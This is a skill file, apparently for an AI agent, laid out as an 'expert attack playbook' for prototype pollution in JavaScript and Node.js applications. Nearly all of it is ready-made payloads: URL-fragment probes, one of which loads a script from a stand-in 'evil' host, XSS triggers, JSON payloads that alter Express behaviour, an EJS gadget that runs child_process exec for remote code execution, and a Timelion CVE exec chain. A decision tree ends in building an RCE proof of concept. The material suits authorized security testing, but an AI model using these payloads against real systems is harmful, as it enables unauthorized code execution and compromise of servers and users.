---
name: prototype-pollution
description: >-
  Prototype pollution testing for JavaScript stacks. Use when user input is
  merged into objects (query parsers, JSON bodies, deep assign), when
  configuring libraries via untrusted keys, or when hunting RCE gadgets via
  polluted Object.prototype in Node or the browser.
---

# SKILL: Prototype Pollution — Expert Attack Playbook

## 0. QUICK START

### Client-side first probes

```text
#__proto__[polluted]=1
#constructor[prototype][polluted]=1
#__proto__[xxx]=alert(1)
```

### Server-side first probes (JSON / form)

```json
{"__proto__":{"polluted":true}}
{"constructor":{"prototype":{"polluted":true}}}
```

If target code uses `lodash.merge`, `deep-extend`, `hoek.applyToDefaults`, or qs/query-string configurations — raise priority.

---

## 1. MECHANISM

**Prototype chain**: when accessing `obj.key`, if `obj` lacks own property `key`, lookup walks up `[[Prototype]]` until `Object.prototype`.

**`__proto__`**: many parsers treat literal key `__proto__` as a magic path that attaches child properties to the prototype. Merging `{ "__proto__": { "x": 1 } }` is equivalent to `Object.prototype.x = 1`.

**`constructor.prototype`**: `constructor` typically points to the object's constructor; `constructor.prototype` is that constructor's prototype. For plain objects this links to `Object.prototype`.

Always **test both paths** — they behave differently depending on parser and Node version.

---

## 2. CLIENT-SIDE DETECTION

```text
https://app.example/page#__proto__[admin]=1
https://app.example/#constructor[prototype][role]=admin
#__proto__[src]=//evil/xss.js
#__proto__[onerror]=alert(1)
```

**Verify**: open a fresh page without fragment and check in console whether test keys remain on `Object.prototype`.

---

## 3. SERVER-SIDE DETECTION (Express / Node, black-box)

| Payload (JSON) | Expected observable signal |
|----------------------|----------------|
| `{"__proto__":{"parameterLimit":1}}` | Multi-parameter parsing in follow-up requests breaks |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | `??foo=bar` style queries accepted |
| `{"__proto__":{"allowDots":true}}` | `?foo.bar=baz` expanded to nested object |
| `{"__proto__":{"json spaces":" "}}` | JSON responses gain extra spaces |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS responses include custom header |
| `{"__proto__":{"status":510}}` | Response status changes to 510 |

Send pollution request first, then a **clean** request to observe persistence.

---

## 4. EXPLOITATION GADGETS

| Target / scenario | Payload or pattern | Notes |
|-------------|------------|------|
| **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | Template options read from polluted prototype → RCE |
| **Node `child_process`** | Pollute `shell`, `argv0`, `env`, `NODE_OPTIONS` in exec/fork option objects | Depends on whether code calls spawn/fork reading from prototype chain |
| **Generic constructor path** | `{"constructor":{"prototype":{"foo":"bar"}}}` | Bypasses weak validation filtering only `__proto__` key |
| **Timelion (CVE-2019-7609)** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("CMD")')` | Historical PP + expression execution chain |

---

## 5. TOOLS

| Project | Purpose |
|------|------|
| **yeswehack/pp-finder** | Locate PP-prone merge points |
| **yuske/server-side-prototype-pollution** | Server-side PP testing suite |
| **BlackFan/client-side-prototype-pollution** | Browser-side PP cases |
| **msrkp/PPScan** | Scanning/verification helper |

---

## 6. DECISION TREE

```
Input merged into nested object?
(query, JSON, GraphQL vars, YAML→JSON)
        |
Parser allows __proto__ / constructor.prototype keys?
        |
Confirm global effect: clean follow-up request
        |
Gadget present? (template engine, spawn, JSON.stringify opts, CORS)
    NO: Report PP as DoS / logic impact
   YES: Build minimal RCE or high-impact PoC
```

## Related routing

- Template execution (non-PP): [SSTI](../ssti-server-side-template-injection/SKILL.md)
- Insecure deserialization (non-JS): [Deserialization](../deserialization-insecure/SKILL.md)
